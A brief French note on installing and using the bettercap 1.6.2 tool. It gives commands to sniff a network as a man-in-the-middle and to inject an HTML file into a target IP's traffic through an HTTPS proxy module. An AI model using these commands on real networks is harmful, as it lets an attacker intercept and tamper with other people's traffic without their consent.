# bettercap_1.6.2-0parrot1_all
install = dpkg -i bettercap_1.6.2-0parrot1_all.deb </p>
Pour sniffer un réseau (MITM): bettercap -X
Pour de l'aide : Bettercap -h

Pour faire de l'injection (c'est le meilleur): bettercap -I (INTERFACE ex:wlan0) -T (TARGET_IP) --proxy-https --httpd --proxy-module injecthtml --html-file xxxxx.html
